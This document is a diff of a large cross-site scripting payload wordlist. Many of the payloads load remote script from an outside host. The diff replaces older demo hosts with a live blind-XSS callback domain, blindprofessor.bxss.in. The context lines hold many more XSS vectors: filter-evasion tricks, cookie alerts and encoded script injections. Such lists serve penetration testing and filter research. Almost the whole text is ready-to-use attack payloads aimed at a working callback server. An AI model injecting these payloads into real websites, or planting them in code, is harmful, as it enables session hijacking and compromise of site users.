 <;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
 <;STYLE>;.XSS{background-image:url(";javascript:alert(';XSS';)";);}<;/STYLE>;<;A CLASS=XSS>;<;/A>;
 <;STYLE>;@im\port';\ja\vasc\ript:alert(";XSS";)';;<;/STYLE>;
@@ -3734,8 +3729,8 @@ ${alert(1)}
 <<SCRIPT>document.vulnerable=true;//<</SCRIPT>
 <<SCRIPT>document.vulnerable=true;//<</SCRIPT>
 <<SCRIPT>document.vulnerable=true;//<</SCRIPT>
-<<scr\0ipt/src=http://xss.com/xss.js></script
-<<scr\0ipt/src=http://xss.com/xss.js></script
+<<scr\0ipt/src=https://blindprofessor.bxss.in></script
+<<scr\0ipt/src=https://blindprofessor.bxss.in></script
 <<script>document.vulnerable=true;</script>
 <<script>document.vulnerable=true;</script>
 <<script>document.vulnerable=true;</script>
@@ -4862,52 +4857,52 @@ ${alert(1)}
 <P STYLE="behavior:url('#default#time2')" end="0" onEnd="javascript:alert(1)">
 <Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
 <Q%^&*(£@!’” style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT "a='>'" SRC="https://blindprofessor.bxss.in"></SCRIPT>
 <SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
 <SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#
 <SCRIPT/SRC="%(jscript)s"></SCRIPT>
 <SCRIPT/SRC="%(jscript)s"></SCRIPT>
 <SCRIPT/SRC="%(jscript)s"></SCRIPT>
 <SCRIPT/SRC="%(jscript)s"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT/XSS SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT =">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT =">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT =">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT =">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT =">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT =">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT ="blah" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT ="blah" SRC="https://blindprofessor.bxss.in"></SCRIPT>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
 <SCRIPT>String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41)</SCRIPT>
@@ -4926,20 +4921,20 @@ ${alert(1)}
 <SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 <SCRIPT> alert(“XSS”); </SCRIPT>
 <SCRIPT> alert(“XSS”); </SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></SCRIPT>
 <SCRIPT>document.write("XSS");</SCRIPT>
 <SCRIPT>document.write("XSS");</SCRIPT>
 <SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>
@@ -4974,74 +4969,74 @@ ${alert(1)}
 <SCRIPT SRC=//ha.ckers.org/.j>
 <SCRIPT SRC=//ha.ckers.org/.j>
 <SCRIPT SRC=//ha.ckers.org/.j>
-<SCRIPT SRC=http://ha.ckers.org/xss.js
-<SCRIPT SRC=http://ha.ckers.org/xss.js
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
-<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
-<SCRIPT SRC=http://hacker-site.com/xss.js></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
-<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in
+<SCRIPT SRC=https://blindprofessor.bxss.in
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in?<B>
+<SCRIPT SRC=https://blindprofessor.bxss.in?<B>
+<SCRIPT SRC=https://blindprofessor.bxss.in?< B >
+<SCRIPT SRC=https://blindprofessor.bxss.in?< B >
+<SCRIPT SRC=https://blindprofessor.bxss.in?< B >
+<SCRIPT SRC=https://blindprofessor.bxss.in?< B >
+<SCRIPT SRC=https://blindprofessor.bxss.in?< B >
+<SCRIPT SRC=https://blindprofessor.bxss.in?< B >
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT SRC=https://blindprofessor.bxss.in></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=">'>" SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a="blah" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a="blah" '' SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
+<SCRIPT a=`>` SRC="https://blindprofessor.bxss.in"></SCRIPT>
 <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
 <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
 <SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>
@@ -9242,8 +9237,8 @@ ${alert(1)}
 <div id="122"><iframe sandbox="allow-same-origin allow-forms allow-scripts" src="http://example.org/"></iframe>//["'`-->]]>]</div>
 <div id="123"><span class=foo>Some text</span>
 <div id="123"><span class=foo>Some text</span>
-<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
-<div id="124"><script src="/\example.com\foo.js"></script> // Safari 5.0, Chrome 9, 10
+<div id="124"><script src="/\https://blindprofessor.bxss.in"></script> // Safari 5.0, Chrome 9, 10
+<div id="124"><script src="/\https://blindprofessor.bxss.in"></script> // Safari 5.0, Chrome 9, 10
 <div id="125"><?xml version="1.0"?>
 <div id="125"><?xml version="1.0"?>
 <div id="126"><object id="x" classid="clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598"></object>
@@ -9388,10 +9383,10 @@ ${alert(1)}
 <div style="binding: url([link to code]);">
 <div style="binding: url([link to code]);">
 <div style="binding: url([link to code]);">
-<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
-<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
-<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
-<div style="binding: url(http://www.securitycompass.com/xss.js);"> [Mozilla]
+<div style="binding: url(https://blindprofessor.bxss.in);"> [Mozilla]
+<div style="binding: url(https://blindprofessor.bxss.in);"> [Mozilla]
+<div style="binding: url(https://blindprofessor.bxss.in);"> [Mozilla]
+<div style="binding: url(https://blindprofessor.bxss.in);"> [Mozilla]
 <div style="font-family:'foo&#10;;color:red;';">LOL
 <div style="font-family:'foo&#10;;color:red;';">LOL
 <div style="font-family:'foo&#10;;color:red;';">XXX
@@ -15018,10 +15013,10 @@ ${alert(1)}
 <scr<script>ipt>alert('XSS');</scr</script>ipt>
 <scr<script>ipt>alert(document.cookie)</scr</script>ipt>
 <scr<script>ipt>alert(document.cookie)</scr</script>ipt>
-<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
-<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
-<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
-<script "a='>'" SRC="http://www.securitycompass.com/xss.js"></script>
+<script "a='>'" SRC="https://blindprofessor.bxss.in"></script>
+<script "a='>'" SRC="https://blindprofessor.bxss.in"></script>
+<script "a='>'" SRC="https://blindprofessor.bxss.in"></script>
+<script "a='>'" SRC="https://blindprofessor.bxss.in"></script>
 <script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
 <script+src=">"+src="http://yoursite.com/xss.js?69,69"></script>
 <script/&Tab; src='https://dl.dropbox.com/u/13018058/js.js' /&Tab;></script>
@@ -15088,10 +15083,10 @@ ${alert(1)}
 <script <B>document.vulnerable=true;</script>
 <script <B>document.vulnerable=true;</script>
 <script <B>document.vulnerable=true;</script>
-<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script =">" SRC="http://www.securitycompass.com/xss.js"></script>
+<script =">" SRC="https://blindprofessor.bxss.in"></script>
+<script =">" SRC="https://blindprofessor.bxss.in"></script>
+<script =">" SRC="https://blindprofessor.bxss.in"></script>
+<script =">" SRC="https://blindprofessor.bxss.in"></script>
 <script>
 <script>
 <script>
@@ -15218,10 +15213,10 @@ ${alert(1)}
 <script>document.vulnerable=true;</script>
 <script>document.vulnerable=true;</script>
 <script>document.vulnerable=true;</script>
-<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
-<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
-<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
-<script>document.write("<SCRI");</SCRIPT>PT SRC="http://www.securitycompass.com/xss.js"></script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></script>
+<script>document.write("<SCRI");</SCRIPT>PT SRC="https://blindprofessor.bxss.in"></script>
 <script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~prompt(1)</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>     <script>(()=>{return this})().alert(1)</script>    
 <script>eval('\\u'+'0061'+'lert(1)')</script>     <script>throw~delete~typeof~prompt(1)</script>     <script>delete[a=alert]/prompt a(1)</script>     <script>delete[a=this[atob('YWxlcnQ=')]]/prompt a(1)</script>     <script>(()=>{return this})().alert(1)</script>    
 <script>for((i)in(self))eval(i)(1)</script>
@@ -15438,22 +15433,22 @@ ${alert(1)}
 <script ^__^>alert(String.fromCharCode(49))</script ^__^
 <script ^__^>alert(String.fromCharCode(49))</script ^__^
 <script ^__^>alert(String.fromCharCode(49))</script ^__^
-<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" '' SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=">'>" SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
-<script a=`>` SRC="http://www.securitycompass.com/xss.js"></script>
+<script a=">" '' SRC="https://blindprofessor.bxss.in"></script>
+<script a=">" '' SRC="https://blindprofessor.bxss.in"></script>
+<script a=">" '' SRC="https://blindprofessor.bxss.in"></script>
